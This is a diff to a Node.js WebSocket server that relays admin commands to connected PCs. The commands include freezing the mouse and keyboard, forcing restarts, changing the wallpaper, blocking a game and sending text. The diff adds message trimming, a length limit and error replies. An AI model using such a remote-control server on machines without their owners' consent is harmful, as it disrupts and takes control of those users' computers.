@@ -20,14 +20,14 @@ setInterval(() => {
   }
 }, 5000);
 
-const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "COOK_PC_UI", "CHANGE_WALLPAPER", "BYE"];
+const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "COOK_PC_UI", "CHANGE_WALLPAPER", "BLOCK_VALORANT", "UNBLOCK_VALORANT", "BYE"]; // ! TEXT_ IS A SPECIAL COMMAND
 const knownSpecialCommands = ["ALL"];
 
 wss.on("connection", (socket) => {
   let clientUUID = null;
 
   socket.on("message", (data) => {
-    const msg = data.toString();
+    const msg = data.toString().trim();
 
     if (msg.startsWith("HELLO_")) {
       const name = msg.substring(6);
@@ -82,19 +82,26 @@ wss.on("connection", (socket) => {
       socket.send(response || "NO_CLIENTS");
       return;
     } else if (msg.includes("|")) {
+      if (msg.length <= 80)
+        console.log(`Received: [${msg}] from an ADM.`);
+      else {
+        console.log("Message too big, rejecting...");
+        socket.send("Message to big, max 80 characters.");
+        
+        return;
+      }
+
       const parts = msg.split("|");
       const firstPart = parts[0];
       const command = parts[1];
       const arg1 = parts[2];
-
-      // console.log(msg);
 
       if (clients.get(clientUUID)?.type !== "ADM") {
         socket.send("ERROR_UNAUTHORIZED");
         return;
       }
 
-      if (!knownCommands.includes(command)) return;
+      if (!knownCommands.includes(command) && !command.startsWith("TEXT_")) return;
 
       if (knownSpecialCommands.includes(firstPart.toUpperCase())) {
         if (firstPart.toUpperCase() === "ALL") {
@@ -126,6 +133,10 @@ wss.on("connection", (socket) => {
         client.socket.send(`${command}|${arg1}`);
       else
         client.socket.send(command);
+
+      return;
+    } else if (msg != "PING") {
+      socket.send("Invalid command.");
 
       return;
     }
